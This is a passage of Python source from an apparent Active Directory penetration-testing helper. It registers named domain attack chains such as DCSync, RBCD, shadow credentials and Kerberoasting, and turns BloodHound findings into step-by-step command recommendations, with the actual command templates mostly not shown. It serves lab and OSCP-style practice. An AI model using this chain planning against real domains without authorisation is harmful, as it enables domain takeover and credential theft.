                "Ensure /etc/hosts has target_dc resolved and clocks are within 5 minutes of target (Kerberos skew)."
            ),
        ),
    ],
)


# Registry of all known attack chains
ATTACK_CHAINS: List[AttackChain] = [
    EXCHANGE_DCSYNC_CHAIN,
    GENERICALL_PASSWORD_RESET_CHAIN,
    FORCECHANGEPASSWORD_CHAIN,
    BACKUP_OPERATORS_CHAIN,
    RBCD_CHAIN,
    UNCONSTRAINED_DELEGATION_COERCION_CHAIN,
    SHADOW_CREDENTIALS_CHAIN,
    TARGETED_KERBEROAST_CHAIN,
    DNSADMINS_CHAIN,
    SERVER_OPERATORS_CHAIN,
    PRINT_OPERATORS_CHAIN,
    CROSS_TRUST_SID_HISTORY_CHAIN,
]


# ============================================================================
# CHAIN DETECTION
# ============================================================================

class ChainDetector:
    """
    Detect viable attack chains from BloodHound findings.

    Analyzes findings to determine which attack chains are possible
    and generates context-aware recommendations for execution.
    """

    def __init__(
        self,
        state: AttackState,
        chains: Optional[List[AttackChain]] = None,
    ):
        """
        Initialize chain detector.

        Args:
            state: Current attack state with findings
            chains: Known attack chains (defaults to ATTACK_CHAINS)
        """
        self.state = state
        self.chains = chains or ATTACK_CHAINS
        self._detected_chains: Dict[str, ChainStatus] = {}
        self._chain_progress: Dict[str, int] = {}  # chain_id -> step index

    def detect_viable_chains(self) -> List[AttackChain]:
        """
        Detect all attack chains that are currently viable.

        A chain is viable if all its required_finding_tags are present
        in the current state's findings.

        Returns:
            List of viable attack chains, sorted by priority
        """
        viable = []

        # Collect all tags from findings
        all_tags = set()
        for finding in self.state.findings.values():
            all_tags.update(finding.tags)

        # Check each chain
        for chain in self.chains:
            required_tags = set(chain.required_finding_tags)
            if required_tags.issubset(all_tags):
                self._detected_chains[chain.id] = ChainStatus.READY
                viable.append(chain)
            else:
                missing = required_tags - all_tags
                self._detected_chains[chain.id] = ChainStatus.NOT_VIABLE

        # Sort by priority (CRITICAL first)
        viable.sort(key=lambda c: c.priority.value)

        return viable

    def get_chain_requirements(self, chain: AttackChain) -> Dict[str, Any]:
        """
        Get what's needed vs what we have for a chain.

        Returns:
            Dict with 'required', 'present', 'missing' tag lists
        """
        all_tags = set()
        for finding in self.state.findings.values():
            all_tags.update(finding.tags)

        required = set(chain.required_finding_tags)
        present = required.intersection(all_tags)
        missing = required - all_tags

        return {
            "required": list(required),
            "present": list(present),
            "missing": list(missing),
            "viable": len(missing) == 0,
        }

    def generate_chain_recommendations(
        self,
        chain: AttackChain,
        context: Dict[str, str],
    ) -> List[Recommendation]:
        """
        Generate recommendations for all steps in a chain.

        Args:
            chain: The attack chain to generate recommendations for
            context: Variables to fill in command templates
                    (e.g., {"target": "10.10.10.161", "domain": "htb.local"})

        Returns:
            List of Recommendation objects for each step
        """
        recommendations = []

        for i, step in enumerate(chain.steps):
            rec = self._step_to_recommendation(chain, step, i, context)
            if rec:
                recommendations.append(rec)

        return recommendations

    def _step_to_recommendation(
        self,
        chain: AttackChain,
        step: ChainStep,
        step_index: int,
        context: Dict[str, str],
    ) -> Optional[Recommendation]:
        """Convert a chain step to a recommendation."""

        # Check if we have all required variables
        missing_vars = []
        for var in step.required_vars:
            if var not in context:
                missing_vars.append(var)

        # Fill in command template
        try:
            command = step.command_template.format(**context)
        except KeyError as e:
            # Missing variable - note it in the recommendation
            command = step.command_template
            for var in step.required_vars:
                if var not in context:
                    command = command.replace(f"{{{var}}}", f"<{var.upper()}>")

        # Build description with chain context
        description = f"[{chain.name} - Step {step_index + 1}/{len(chain.steps)}] {step.name}"

        # Build WHY with context
        why = step.why
        if step.on_success_note:
            why += f"\n\nOn success: {step.on_success_note}"

        # Determine action type
        action_type = "manual_step" if step.platform == "target" else "run_command"

        # Create recommendation
        rec = Recommendation(
            id=f"chain_{chain.id}_step_{step.id}_{uuid.uuid4().hex[:8]}",
            priority=chain.priority,
            trigger_finding_id=f"chain_{chain.id}",
            action_type=action_type,
            description=description,
            why=why,
            command=command,
            metadata={
                "chain_id": chain.id,
                "chain_name": chain.name,
                "step_id": step.id,
                "step_index": step_index,
                "total_steps": len(chain.steps),
                "platform": step.platform,
                "missing_vars": missing_vars,
                "requires_upload": step.metadata.get("requires_upload"),
            },
        )

        # Set up chaining
        if step_index < len(chain.steps) - 1:
            next_step = chain.steps[step_index + 1]
            rec.on_success = [f"chain_{chain.id}_step_{next_step.id}"]

        return rec


def detect_and_recommend(
    state: AttackState,
    context: Dict[str, str],
) -> List[Recommendation]:
    """
    Main entry point: detect viable chains and generate recommendations.

    Args:
        state: Current attack state with findings
        context: Variables for command generation

    Returns:
        List of recommendations for all viable attack chains
    """
    detector = ChainDetector(state)
    viable_chains = detector.detect_viable_chains()

    all_recommendations = []
    for chain in viable_chains:
        chain_recs = detector.generate_chain_recommendations(chain, context)
        all_recommendations.extend(chain_recs)

    return all_recommendations


def get_chain_summary(state: AttackState) -> str:
    """
    Generate a summary of detected attack chains.

    Args:
        state: Current attack state

    Returns:
        Formatted string describing viable chains
    """
    detector = ChainDetector(state)
    viable = detector.detect_viable_chains()

    if not viable:
        return "No attack chains detected from current findings."

    lines = [f"Detected {len(viable)} viable attack chain(s):\n"]

    for chain in viable:
        lines.append(f"[{chain.priority.name}] {chain.name}")
        lines.append(f"    {chain.description}")
        lines.append(f"    Steps: {len(chain.steps)}")
        lines.append(f"    OSCP: {chain.oscp_relevance}")
        lines.append("")

    return "\n".join(lines)
